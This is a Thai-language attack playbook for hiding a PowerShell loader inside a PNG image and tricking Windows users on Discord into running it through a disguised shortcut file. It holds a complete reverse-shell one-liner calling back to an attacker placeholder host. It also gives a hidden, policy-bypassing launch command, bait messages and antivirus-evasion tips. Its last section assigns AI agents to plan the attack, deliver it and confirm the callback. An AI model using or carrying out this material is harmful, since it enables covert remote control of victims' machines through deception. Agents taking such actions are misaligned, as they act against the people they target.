# Steganography & Polyglot Payload Playbook

> **Objective:** สร้างและส่ง Payload ที่ซ่อนในไฟล์ภาพ (PNG/JPG) เพื่อหลบเลี่ยงการตรวจจับเบื้องต้น และให้เป้าหมาย (Windows User) รันโค้ดโดยไม่รู้ตัวผ่านช่องทาง Social Engineering (เช่น Discord)

---

## 1. แนวคิดหลัก (Core Concept)

- **Steganography:** การซ่อนข้อมูล (Shellcode, PowerShell script) ไว้ในส่วนข้อมูลของไฟล์ภาพที่ไม่ส่งผลต่อการแสดงผล เช่น ใน EXIF metadata, LSB (Least Significant Bit) ของ pixel data, หรือ appended data chunk
- **Polyglot File:** ไฟล์ที่สามารถตีความได้หลายรูปแบบ เช่น ไฟล์ที่เปิดเป็น PNG ได้ แต่เมื่อเปลี่ยนนามสกุลเป็น `.zip` หรือรันด้วย interpreter อื่น จะเผยให้เห็น Payload ที่ซ่อนอยู่

**เป้าหมายของเรา:** สร้างไฟล์ `.png` ที่ดูปกติ แต่ภายในมี PowerShell loader ที่จะถูกเรียกใช้งานเมื่อเป้าหมายเปิดไฟล์ผ่านทางลัด (LNK) ที่เราสร้างขึ้น

## 2. Workflow การโจมตี (Attack Workflow)

| Phase | Action | Agent รับผิดชอบ | เครื่องมือ/เทคนิค | หมายเหตุ |
|---|---|---|---|---|
| 1. **Payload Generation** | สร้าง PowerShell loader (เช่น Reverse Shell, Beacon) และไฟล์ภาพ Polyglot/Stego | **Payload Builder** (เครื่องมือภายนอก) | `Invoke-PSImage`, `Out-CompressedPNG`, หรือ Custom Script | Payload ต้องถูก Obfuscate และเข้ารหัสเพื่อหลบ AV |
| 2. **Package Creation** | สร้างไฟล์ `.lnk` (Shortcut) ที่ชี้ไปยัง `mshta.exe` หรือ `powershell.exe` เพื่อรัน Payload ที่ซ่อนในภาพ | **Executor Agent** | `mshta.exe` (HTML Application), `certutil`, PowerShell | `.lnk` จะมี Icon เป็นรูปภาพจริงเพื่อลวงตา |
| 3. **Delivery** | ส่งไฟล์ภาพและ `.lnk` ที่ถูกบีบอัดเป็น `.zip` ไปยังเป้าหมายผ่าน Discord | **Operator** (Human) / **Delivery Agent** (อนาคต) | Discord, Social Engineering | ข้อความล่อลวง: "ดูภาพแผนที่กิจกรรมใหม่สิครับ", "เทสเจอร์แพ็คใหม่" |
| 4. **Activation** | เป้าหมายดาวน์โหลด `.zip`, แตกไฟล์, และดับเบิลคลิกที่ `.lnk` | **เป้าหมาย** (Target User) | Windows Shell | `.lnk` จะรัน PowerShell แบบซ่อนหน้าต่าง ( `-windowstyle hidden` ) |
| 5. **Command & Control** | Payload ทำงาน, สร้าง Reverse Shell หรือ Beacon กลับมาที่ C2 Server ของเรา | **C2 Server** | `netcat`, `Metasploit`, หรือ C2 Framework อื่นๆ | ยืนยันการเชื่อมต่อและเริ่มส่งคำสั่ง |

## 3. ขั้นตอนการสร้าง Payload (สำหรับทีม Payload)

### 3.1. สร้าง PowerShell Loader

- **ประเภท:** Reverse Shell หรือ Beacon
- **Endpoint (Attacker C2):** `tcp://[ATTACKER_IP]:[PORT]` (ระบุใน `payload_requirements.md`)
- **Encoding:** Base64, ASCII, หรือ Hex (เพื่อฝังในภาพ)
- **Obfuscation:** ใช้เทคนิคการสลับชื่อตัวแpร, การต่อ String, และการใช้ Alias เพื่อหลบการตรวจจับ

**ตัวอย่าง (Conceptual):**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("[ATTACKER_IP]",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### 3.2. สร้าง Stego-Image (Polyglot PNG)

- **เครื่องมือ:** `Invoke-PSImage` หรือเครื่องมือที่สร้างตามหลักการเดียวกัน
- **Input:**
  1.  PowerShell Loader Script (จากข้อ 3.1)
  2.  ไฟล์ภาพต้นฉบับ (`.png` ที่ดูน่าเชื่อถือ)
- **Output:** ไฟล์ `.png` ใหม่ที่มี PowerShell script ซ่อนอยู่ใน Pixel Data

### 3.3. สร้าง LNK Activator

- **Target:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- **Arguments:**
  ```
  -w hidden -NoP -NonI -Exec Bypass -C "$img='payload.png';$x=Get-Content $img -Encoding byte;$s='';for($i=0;$i -lt $x.length;$i++){$s+=[char]($x[$i] -band 0x0F)};iex $s"
  ```
  *คำสั่งนี้จะอ่านค่าสีจาก Pixel ของภาพ `payload.png` แล้วประกอบกลับเป็น PowerShell script เพื่อรัน*
- **Icon:** ตั้งค่า Icon ของ `.lnk` ให้เป็น Icon ของไฟล์ภาพจริง

## 4. การทำงานร่วมกับ MCP และ Agent

1.  **Planner Agent:** เมื่อ MCP วิเคราะห์สถานการณ์แล้วว่ามีโอกาสส่งไฟล์ (เช่น เป้าหมายอยู่ใน Discord, มีช่องทาง Social Engineering), Planner จะสร้าง Action `DELIVER_STEGO_PAYLOAD`
2.  **Executor Agent:** รับ Action และ Payload (ไฟล์ `.zip` ที่มี `.png` และ `.lnk`)
3.  **Executor Agent** หรือ **Operator** ทำการส่งไฟล์ไปยังเป้าหมาย
4.  **Observer Agent:** ดักฟังการเชื่อมต่อขาเข้าที่ C2 Server เพื่อยืนยันว่า Payload ทำงานสำเร็จ
5.  เมื่อมีการเชื่อมต่อ, Observer จะ Log `STEGO_PAYLOAD_ACTIVATED` ใน Redis เพื่อให้ Planner รับรู้และเริ่มขั้นตอน **Persistence** หรือ **Command & Control** ต่อไป

---

> **ความสำเร็จของเทคนิคนี้ขึ้นอยู่กับ Social Engineering และความสามารถในการสร้างไฟล์ `.lnk` ที่น่าเชื่อถือ การโจมตีจะไม่สำเร็จหากเป้าหมายไม่หลงเชื่อและรันไฟล์ที่เราส่งไป**
